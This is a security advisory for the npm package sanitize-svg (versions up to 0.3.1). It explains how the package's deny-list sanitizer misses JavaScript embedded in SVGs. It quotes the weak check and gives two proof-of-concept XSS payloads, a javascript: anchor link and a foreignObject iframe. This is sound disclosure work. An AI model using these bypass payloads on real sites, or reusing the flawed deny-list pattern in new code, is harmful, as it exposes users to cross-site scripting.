# Filter Bypass Allows Cross-Site Scripting (XSS)

High

[mattkrick](/mattkrick)
published
GHSA-h857-2g56-468g
Jan 4, 2023

## Package

npm

sanitize-svg
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<= 0.3.1

## Patched versions

0.4

## Description

### Impact

The *sanitize-svg* package uses a deny-list-pattern to sanitize SVGs to prevent XSS. In doing so, literal `<script>`-tags and on-event handlers were detected:

```
[...]
  const svgEl = div.firstElementChild!
  const attributes = Array.from(svgEl.attributes).map(({ name }) => name)
  const hasScriptAttr = !!attributes.find((attr) => attr.startsWith('on'))
  const scripts = svgEl.getElementsByTagName('script')
  return scripts.length === 0 && !hasScriptAttr ? svg : null
[...]
```

There are more ways to embed JavaScript in XML files.

**Anchor Tag** (requires user to click link):

```
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <a href="javascript:alert(document.domain)">
    <text x="50" y="50" text-anchor="middle">Lauritz</text>
  </a>
</svg>
```

**Foreign Object Tag** (no user interaction required):

```
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <text x="20" y="35">Lauritz</text>
        <foreignObject width="500" height="500">
                <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:confirm(document.domain);" width="400" height="250"/>
        </foreignObject>
</svg>
```

As a result, downstream software that relies on `sanitize-svg` and expects resulting SVGs to be safe, may be vulnerable to XSS. We are aware of at least one downstream project for which this vulnerability had security implications.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
